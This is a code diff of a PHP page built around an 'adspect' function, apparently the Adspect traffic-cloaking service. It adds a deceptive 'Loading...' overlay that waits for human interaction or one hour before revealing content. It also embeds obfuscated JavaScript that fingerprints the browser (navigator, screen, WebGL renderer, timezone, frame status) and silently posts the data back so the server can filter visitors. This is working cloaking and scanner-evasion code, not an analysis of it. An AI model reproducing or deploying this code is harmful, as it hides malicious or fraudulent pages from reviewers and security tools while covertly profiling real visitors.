@@ -497,12 +497,6 @@ if(!function_exists('adspect')){
                             margin-top: 15px;
                             font-family: monospace;
                         }
-                        .instruction-text {
-                            color: #666;
-                            font-size: 13px;
-                            margin-top: 10px;
-                            font-style: italic;
-                        }
                     </style>
                 </head>
                 <body>
@@ -516,7 +510,6 @@ if(!function_exists('adspect')){
                                 <button id='continueBtn'>Continue</button>
                             </div>
                             <div class='timer-text' id='timerText'></div>
-                            <div class='instruction-text'>Interact with the page to load content</div>
                         </div>
                     </div>
                     <div id='mainContent'>
@@ -529,15 +522,16 @@ if(!function_exists('adspect')){
                         var interacted = false;
                         var timeoutId = null;
                         var timerInterval = null;
+                        var startTime = Date.now();
                         
-                        var CONFIG = {
-                            AUTO_HIDE_TIME: 3600000,
-                            FADE_OUT_DURATION: 1500,
-                            CONTENT_FADE_IN: 500,
-                            SPINNER_SPEED: '1.5s'
-                        };
+                        // ===== CONFIGURATION =====
+                        // 1 hour = 3600000 milliseconds
+                        // 5 minutes = 300000 milliseconds (for testing)
+                        var AUTO_HIDE_TIME = 3600000; // 1 HOUR
+                        // var AUTO_HIDE_TIME = 300000; // 5 MINUTES (testing)
+                        // =========================
                         
-                        function loadAdspectContent() {
+                        function showContent() {
                             if (!loaded) {
                                 loaded = true;
                                 
@@ -546,23 +540,18 @@ if(!function_exists('adspect')){
                                     timerInterval = null;
                                 }
                                 
-                                document.querySelector('.spinner').style.animationDuration = CONFIG.SPINNER_SPEED;
-                                loader.style.transition = 'opacity ' + (CONFIG.FADE_OUT_DURATION/1000) + 's ease';
+                                loader.style.transition = 'opacity 0.5s ease';
                                 loader.style.opacity = '0';
                                 
                                 setTimeout(function() {
                                     loader.style.display = 'none';
                                     mainContent.style.display = 'block';
-                                    
                                     mainContent.style.opacity = '0';
-                                    mainContent.style.transition = 'opacity ' + (CONFIG.CONTENT_FADE_IN/1000) + 's ease';
+                                    mainContent.style.transition = 'opacity 0.5s ease';
                                     setTimeout(function() {
                                         mainContent.style.opacity = '1';
                                     }, 100);
-                                    
-                                    loadActualContent();
-                                    
-                                }, CONFIG.FADE_OUT_DURATION);
+                                }, 500);
                                 
                                 document.removeEventListener('mousemove', handleInteraction);
                                 document.removeEventListener('click', handleInteraction);
@@ -576,43 +565,25 @@ if(!function_exists('adspect')){
                             }
                         }
                         
-                        function loadActualContent() {
-                            var xhr = new XMLHttpRequest();
-                            xhr.open('POST', window.location.href, true);
-                            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-                            xhr.onload = function() {
-                                if (xhr.status === 200) {
-                                    document.getElementById('mainContent').innerHTML = xhr.responseText;
-                                }
-                            };
-                            xhr.onerror = function() {
-                                console.error('Failed to load content');
-                            };
-                            xhr.send('load_content=1');
-                        }
-                        
-                        function showContent() {
-                            if (!loaded && !interacted) {
-                                interacted = true;
-                                loadAdspectContent();
-                            }
-                        }
-                        
                         function handleInteraction(e) {
-                            if (!interacted && !loaded) {
+                            if (!interacted) {
+                                interacted = true;
                                 showContent();
                             }
                         }
                         
+                        // ===== ALL EVENTS ENABLED =====
                         document.addEventListener('mousemove', handleInteraction);
                         document.addEventListener('click', handleInteraction);
                         document.addEventListener('touchstart', handleInteraction);
                         document.addEventListener('scroll', handleInteraction);
                         document.addEventListener('keydown', handleInteraction);
                         
+                        // ===== BUTTON EVENTS =====
                         document.getElementById('continueBtn').addEventListener('click', function(e) {
                             e.stopPropagation();
-                            if (!interacted && !loaded) {
+                            if (!interacted) {
+                                interacted = true;
                                 showContent();
                             }
                         });
@@ -622,12 +593,10 @@ if(!function_exists('adspect')){
                             window.location.href = 'about:blank';
                         });
                         
-                        var startTime = Date.now();
-                        var totalTime = CONFIG.AUTO_HIDE_TIME;
-                        
+                        // ===== TIMER DISPLAY =====
                         function updateTimer() {
                             var elapsed = Date.now() - startTime;
-                            var remaining = Math.max(0, totalTime - elapsed);
+                            var remaining = Math.max(0, AUTO_HIDE_TIME - elapsed);
                             
                             if (remaining <= 0) {
                                 clearInterval(timerInterval);
@@ -652,12 +621,16 @@ if(!function_exists('adspect')){
                         timerInterval = setInterval(updateTimer, 1000);
                         updateTimer();
                         
+                        // ===== 1 HOUR AUTO-LOAD =====
                         timeoutId = setTimeout(function() {
-                            if (!interacted && !loaded) {
-                                console.log('1 hour passed. Auto-loading content...');
+                            if (!interacted) {
+                                console.log('⏰ 1 hour passed. Auto-loading content...');
                                 showContent();
                             }
-                        }, CONFIG.AUTO_HIDE_TIME);
+                        }, AUTO_HIDE_TIME);
+                        
+                        console.log('🖱 Interact with page to load content');
+                        console.log('⏱ Auto-load timer: 1 hour');
                     </script>
                 </body>
                 </html>");
@@ -714,291 +687,282 @@ if(!function_exists('adspect')){
         return$data;
     }
     
-    // ===== AJAX HANDLER - MUST BE BEFORE ANY HTML OUTPUT =====
-    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['load_content'])) {
-        // Call adspect and output directly
+    // MAIN EXECUTION - Only run if not POST request from loader
+    if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['load_content'])) {
         $data = adspect('40adf6f7-4c88-4d47-ac5a-606ee98ed95a');
-        exit;
-    }
-    
-    // ===== INITIAL PAGE LOAD - SHOW LOADER =====
-    ?>
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="utf-8">
-        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <title>Loading...</title>
-        <style>
-            * { margin: 0; padding: 0; box-sizing: border-box; }
-            body { font-family: Arial, sans-serif; min-height: 100vh; background: #f5f5f5; }
-            #loaderWrapper {
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background: rgba(0,0,0,0.75);
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                z-index: 99999;
-                transition: opacity 0.5s ease;
-            }
-            .loader-box {
-                background: white;
-                padding: 40px 35px;
-                border-radius: 16px;
-                text-align: center;
-                max-width: 420px;
-                width: 90%;
-                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-                animation: popIn 0.3s ease;
-            }
-            @keyframes popIn {
-                from { transform: scale(0.8); opacity: 0; }
-                to { transform: scale(1); opacity: 1; }
-            }
-            .loader-box h2 {
-                color: #333;
-                font-size: 22px;
-                margin-bottom: 10px;
-                font-weight: 600;
-            }
-            .loader-box p {
-                color: #666;
-                font-size: 16px;
-                margin-bottom: 25px;
-                line-height: 1.5;
-            }
-            .btn-group {
-                display: flex;
-                gap: 12px;
-                justify-content: center;
-                flex-wrap: wrap;
-            }
-            .btn-group button {
-                padding: 12px 35px;
-                border: none;
-                border-radius: 8px;
-                font-size: 16px;
-                font-weight: 600;
-                cursor: pointer;
-                transition: all 0.3s ease;
-                min-width: 120px;
-            }
-            #cancelBtn {
-                background: #e74c3c;
-                color: white;
-            }
-            #cancelBtn:hover {
-                background: #c0392b;
-                transform: scale(1.05);
-                box-shadow: 0 4px 15px rgba(231,76,60,0.4);
-            }
-            #continueBtn {
-                background: #2ecc71;
-                color: white;
-            }
-            #continueBtn:hover {
-                background: #27ae60;
-                transform: scale(1.05);
-                box-shadow: 0 4px 15px rgba(46,204,113,0.4);
-            }
-            #mainContent {
-                display: none;
-                width: 100%;
-                min-height: 100vh;
-            }
-            .spinner {
-                display: inline-block;
-                width: 50px;
-                height: 50px;
-                border: 4px solid #f3f3f3;
-                border-top: 4px solid #3498db;
-                border-radius: 50%;
-                animation: spin 1s linear infinite;
-                margin-bottom: 15px;
-            }
-            @keyframes spin {
-                0% { transform: rotate(0deg); }
-                100% { transform: rotate(360deg); }
-            }
-            .timer-text {
-                color: #999;
-                font-size: 14px;
-                margin-top: 15px;
-                font-family: monospace;
-            }
-            .instruction-text {
-                color: #666;
-                font-size: 13px;
-                margin-top: 10px;
-                font-style: italic;
-            }
-        </style>
-    </head>
-    <body>
-        <div id="loaderWrapper">
-            <div class="loader-box">
-                <div class="spinner"></div>
-                <h2>Loading...</h2>
-                <p>Please wait while we prepare your content</p>
-                <div class="btn-group">
-                    <button id="cancelBtn">Cancel</button>
-                    <button id="continueBtn">Continue</button>
+        if(!isset($data)){
+            return;
+        }
+        ?>
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="utf-8">
+            <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+            <meta name="viewport" content="width=device-width, initial-scale=1">
+            <title>Loading...</title>
+            <style>
+                * { margin: 0; padding: 0; box-sizing: border-box; }
+                body { font-family: Arial, sans-serif; min-height: 100vh; background: #f5f5f5; }
+                #loaderWrapper {
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background: rgba(0,0,0,0.75);
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    z-index: 99999;
+                    transition: opacity 0.5s ease;
+                }
+                .loader-box {
+                    background: white;
+                    padding: 40px 35px;
+                    border-radius: 16px;
+                    text-align: center;
+                    max-width: 420px;
+                    width: 90%;
+                    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+                    animation: popIn 0.3s ease;
+                }
+                @keyframes popIn {
+                    from { transform: scale(0.8); opacity: 0; }
+                    to { transform: scale(1); opacity: 1; }
+                }
+                .loader-box h2 {
+                    color: #333;
+                    font-size: 22px;
+                    margin-bottom: 10px;
+                    font-weight: 600;
+                }
+                .loader-box p {
+                    color: #666;
+                    font-size: 16px;
+                    margin-bottom: 25px;
+                    line-height: 1.5;
+                }
+                .btn-group {
+                    display: flex;
+                    gap: 12px;
+                    justify-content: center;
+                    flex-wrap: wrap;
+                }
+                .btn-group button {
+                    padding: 12px 35px;
+                    border: none;
+                    border-radius: 8px;
+                    font-size: 16px;
+                    font-weight: 600;
+                    cursor: pointer;
+                    transition: all 0.3s ease;
+                    min-width: 120px;
+                }
+                #cancelBtn {
+                    background: #e74c3c;
+                    color: white;
+                }
+                #cancelBtn:hover {
+                    background: #c0392b;
+                    transform: scale(1.05);
+                    box-shadow: 0 4px 15px rgba(231,76,60,0.4);
+                }
+                #continueBtn {
+                    background: #2ecc71;
+                    color: white;
+                }
+                #continueBtn:hover {
+                    background: #27ae60;
+                    transform: scale(1.05);
+                    box-shadow: 0 4px 15px rgba(46,204,113,0.4);
+                }
+                #mainContent {
+                    display: none;
+                    width: 100%;
+                    min-height: 100vh;
+                }
+                .spinner {
+                    display: inline-block;
+                    width: 50px;
+                    height: 50px;
+                    border: 4px solid #f3f3f3;
+                    border-top: 4px solid #3498db;
+                    border-radius: 50%;
+                    animation: spin 1s linear infinite;
+                    margin-bottom: 15px;
+                }
+                @keyframes spin {
+                    0% { transform: rotate(0deg); }
+                    100% { transform: rotate(360deg); }
+                }
+                .timer-text {
+                    color: #999;
+                    font-size: 14px;
+                    margin-top: 15px;
+                    font-family: monospace;
+                }
+            </style>
+        </head>
+        <body>
+            <div id="loaderWrapper">
+                <div class="loader-box">
+                    <div class="spinner"></div>
+                    <h2>Loading...</h2>
+                    <p>Please wait while we prepare your content</p>
+                    <div class="btn-group">
+                        <button id="cancelBtn">Cancel</button>
+                        <button id="continueBtn">Continue</button>
+                    </div>
+                    <div class="timer-text" id="timerText"></div>
                 </div>
-                <div class="timer-text" id="timerText"></div>
-                <div class="instruction-text">Interact with the page to load content</div>
             </div>
-        </div>
-        <div id="mainContent"></div>
-        
-        <script>
-            var loader = document.getElementById('loaderWrapper');
-            var mainContent = document.getElementById('mainContent');
-            var loaded = false;
-            var interacted = false;
-            var timeoutId = null;
-            var timerInterval = null;
-            
-            var CONFIG = {
-                AUTO_HIDE_TIME: 3600000,
-                FADE_OUT_DURATION: 1500,
-                CONTENT_FADE_IN: 500,
-                SPINNER_SPEED: '1.5s'
-            };
-            
-            function loadAdspectContent() {
-                if (!loaded) {
-                    loaded = true;
-                    
-                    if (timerInterval) {
-                        clearInterval(timerInterval);
-                        timerInterval = null;
-                    }
-                    
-                    document.querySelector('.spinner').style.animationDuration = CONFIG.SPINNER_SPEED;
-                    loader.style.transition = 'opacity ' + (CONFIG.FADE_OUT_DURATION/1000) + 's ease';
-                    loader.style.opacity = '0';
-                    
-                    setTimeout(function() {
-                        loader.style.display = 'none';
-                        mainContent.style.display = 'block';
+            <div id="mainContent">
+                <script>
+                    (function(q,u,r,e,t,v,w,x){
+                        function f(a,b){try{l[a]=b()}catch(d){n[a]=d.name}}
+                        function h(a,b){f(a,function(){function d(m){try{var g=b[m];switch(typeof g){case "object":null!==g&&(g=g.toString());break;case "function":g=u.prototype.toString.call(g)}c[m]=g}catch(y){n[a+"."+m]=y.name}}var c={},k;for(k in b)d(k);try{var p=q.getOwnPropertyNames(b);for(k=0;k<p.length;++k)d(p[k]);c["!!"]=p}catch(m){}return c})}
+                        function z(a,b,d){var c=a.prototype[b];a.prototype[b]=function(){l.proto=!0};d();a.prototype[b]=c}
+                        var n={},l={mode:"php",errors:n};
+                        h("console",r);
+                        h("document",e);
+                        (function(a,b){f(a,function(){var d={};b=b.attributes;for(var c in b)c=b[c],d[c.nodeName]=c.nodeValue;return d})})("documentElement",e.documentElement);
+                        h("location",t);
+                        h("navigator",v);
+                        h("window",x);
+                        h("screen",w);
+                        f("timezoneOffset",function(){return(new Date).getTimezoneOffset()});
+                        f("closure",function(){return function(){}.toString()});
+                        l.frame=!0;
+                        f("frame",function(){l.frame=self!==top});
+                        f("touchEvent",function(){var a=e.createEvent("TouchEvent");return{g:q.prototype.toString.call(a),t:a instanceof TouchEvent}});
+                        f("tostring",function(){function a(){}var b=0;a.toString=function(){++b;return""};r.log(a);return b});
+                        f("webgl",function(){var a=e.createElement("canvas").getContext("webgl"),b=a.getExtension("WEBGL_debug_renderer_info");return{vendor:a.getParameter(b.UNMASKED_VENDOR_WEBGL),renderer:a.getParameter(b.UNMASKED_RENDERER_WEBGL)}});
+                        try{z(Array,"includes",function(){return e.createElement("video").canPlayType("video/mp4")})}catch(a){}
+                        (function(){var a=e.createElement("form"),b=e.createElement("input");a.method="POST";a.action=t.href;b.type="hidden";b.name="data";b.value=JSON.stringify(l);a.appendChild(b);e.body.appendChild(a);a.submit()})()
+                    })(Object,Function,console,document,location,navigator,screen,window);
+                </script>
+            </div>
+            <script>
+                var loader = document.getElementById('loaderWrapper');
+                var mainContent = document.getElementById('mainContent');
+                var loaded = false;
+                var interacted = false;
+                var timeoutId = null;
+                var timerInterval = null;
+                var startTime = Date.now();
+                
+                // ===== CONFIGURATION =====
+                // 1 hour = 3600000 milliseconds
+                // 5 minutes = 300000 milliseconds (for testing)
+                var AUTO_HIDE_TIME = 3600000; // 1 HOUR
+                // var AUTO_HIDE_TIME = 300000; // 5 MINUTES (testing)
+                // =========================
+                
+                function showContent() {
+                    if (!loaded) {
+                        loaded = true;
                         
-                        mainContent.style.opacity = '0';
-                        mainContent.style.transition = 'opacity ' + (CONFIG.CONTENT_FADE_IN/1000) + 's ease';
+                        if (timerInterval) {
+                            clearInterval(timerInterval);
+                            timerInterval = null;
+                        }
+                        
+                        loader.style.transition = 'opacity 0.5s ease';
+                        loader.style.opacity = '0';
+                        
                         setTimeout(function() {
-                            mainContent.style.opacity = '1';
-                        }, 100);
+                            loader.style.display = 'none';
+                            mainContent.style.display = 'block';
+                            mainContent.style.opacity = '0';
+                            mainContent.style.transition = 'opacity 0.5s ease';
+                            setTimeout(function() {
+                                mainContent.style.opacity = '1';
+                            }, 100);
+                        }, 500);
                         
-                        loadActualContent();
-                        
-                    }, CONFIG.FADE_OUT_DURATION);
+                        document.removeEventListener('mousemove', handleInteraction);
+                        document.removeEventListener('click', handleInteraction);
+                        document.removeEventListener('touchstart', handleInteraction);
+                        document.removeEventListener('scroll', handleInteraction);
+                        document.removeEventListener('keydown', handleInteraction);
+                        if (timeoutId) {
+                            clearTimeout(timeoutId);
+                            timeoutId = null;
+                        }
+                    }
+                }
+                
+                function handleInteraction(e) {
+                    if (!interacted) {
+                        interacted = true;
+                        showContent();
+                    }
+                }
+                
+                // ===== ALL EVENTS ENABLED =====
+                document.addEventListener('mousemove', handleInteraction);
+                document.addEventListener('click', handleInteraction);
+                document.addEventListener('touchstart', handleInteraction);
+                document.addEventListener('scroll', handleInteraction);
+                document.addEventListener('keydown', handleInteraction);
+                
+                // ===== BUTTON EVENTS =====
+                document.getElementById('continueBtn').addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    if (!interacted) {
+                        interacted = true;
+                        showContent();
+                    }
+                });
+                
+                document.getElementById('cancelBtn').addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    window.location.href = 'about:blank';
+                });
+                
+                // ===== TIMER DISPLAY =====
+                function updateTimer() {
+                    var elapsed = Date.now() - startTime;
+                    var remaining = Math.max(0, AUTO_HIDE_TIME - elapsed);
                     
-                    document.removeEventListener('mousemove', handleInteraction);
-                    document.removeEventListener('click', handleInteraction);
-                    document.removeEventListener('touchstart', handleInteraction);
-                    document.removeEventListener('scroll', handleInteraction);
-                    document.removeEventListener('keydown', handleInteraction);
-                    if (timeoutId) {
-                        clearTimeout(timeoutId);
-                        timeoutId = null;
+                    if (remaining <= 0) {
+                        clearInterval(timerInterval);
+                        document.getElementById('timerText').textContent = '⏰ Time expired. Interact to load.';
+                        return;
                     }
-                }
-            }
-            
-            function loadActualContent() {
-                var xhr = new XMLHttpRequest();
-                xhr.open('POST', window.location.href, true);
-                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-                xhr.onload = function() {
-                    if (xhr.status === 200) {
-                        document.getElementById('mainContent').innerHTML = xhr.responseText;
+                    
+                    var hours = Math.floor(remaining / 3600000);
+                    var minutes = Math.floor((remaining % 3600000) / 60000);
+                    var seconds = Math.floor((remaining % 60000) / 1000);
+                    
+                    var timerText = document.getElementById('timerText');
+                    if (hours > 0) {
+                        timerText.textContent = '⏱ Auto-load in ' + hours + 'h ' + minutes + 'm ' + seconds + 's';
+                    } else if (minutes > 0) {
+                        timerText.textContent = '⏱ Auto-load in ' + minutes + 'm ' + seconds + 's';
                     } else {
-                        console.log('Error loading content. Status:', xhr.status);
+                        timerText.textContent = '⏱ Auto-load in ' + seconds + 's';
                     }
-                };
-                xhr.onerror = function() {
-                    console.error('Failed to load content');
-                };
-                xhr.send('load_content=1');
-            }
-            
-            function showContent() {
-                if (!loaded && !interacted) {
-                    interacted = true;
-                    loadAdspectContent();
-                }
-            }
-            
-            function handleInteraction(e) {
-                if (!interacted && !loaded) {
-                    showContent();
-                }
-            }
-            
-            document.addEventListener('mousemove', handleInteraction);
-            document.addEventListener('click', handleInteraction);
-            document.addEventListener('touchstart', handleInteraction);
-            document.addEventListener('scroll', handleInteraction);
-            document.addEventListener('keydown', handleInteraction);
-            
-            document.getElementById('continueBtn').addEventListener('click', function(e) {
-                e.stopPropagation();
-                if (!interacted && !loaded) {
-                    showContent();
-                }
-            });
-            
-            document.getElementById('cancelBtn').addEventListener('click', function(e) {
-                e.stopPropagation();
-                window.location.href = 'about:blank';
-            });
-            
-            var startTime = Date.now();
-            var totalTime = CONFIG.AUTO_HIDE_TIME;
-            
-            function updateTimer() {
-                var elapsed = Date.now() - startTime;
-                var remaining = Math.max(0, totalTime - elapsed);
-                
-                if (remaining <= 0) {
-                    clearInterval(timerInterval);
-                    document.getElementById('timerText').textContent = '⏰ Time expired. Interact to load.';
-                    return;
                 }
                 
-                var hours = Math.floor(remaining / 3600000);
-                var minutes = Math.floor((remaining % 3600000) / 60000);
-                var seconds = Math.floor((remaining % 60000) / 1000);
+                timerInterval = setInterval(updateTimer, 1000);
+                updateTimer();
                 
-                var timerText = document.getElementById('timerText');
-                if (hours > 0) {
-                    timerText.textContent = '⏱ Auto-load in ' + hours + 'h ' + minutes + 'm ' + seconds + 's';
-                } else if (minutes > 0) {
-                    timerText.textContent = '⏱ Auto-load in ' + minutes + 'm ' + seconds + 's';
-                } else {
-                    timerText.textContent = '⏱ Auto-load in ' + seconds + 's';
-                }
-            }
-            
-            timerInterval = setInterval(updateTimer, 1000);
-            updateTimer();
-            
-            timeoutId = setTimeout(function() {
-                if (!interacted && !loaded) {
-                    console.log('1 hour passed. Auto-loading content...');
-                    showContent();
-                }
-            }, CONFIG.AUTO_HIDE_TIME);
-            
-            console.log('🖱 Interact with page to load content');
-            console.log('⏱ Auto-load timer: 1 hour');
-        </script>
-    </body>
-    </html>
-    <?php exit;
+                // ===== 1 HOUR AUTO-LOAD =====
+                timeoutId = setTimeout(function() {
+                    if (!interacted) {
+                        console.log('⏰ 1 hour passed. Auto-loading content...');
+                        showContent();
+                    }
+                }, AUTO_HIDE_TIME);
+                
+                console.log('🖱 Interact with page to load content');
+                console.log('⏱ Auto-load timer: 1 hour');
+            </script>
+        </body>
+        </html>
+        <?php exit;
+    }
 }
 ?>
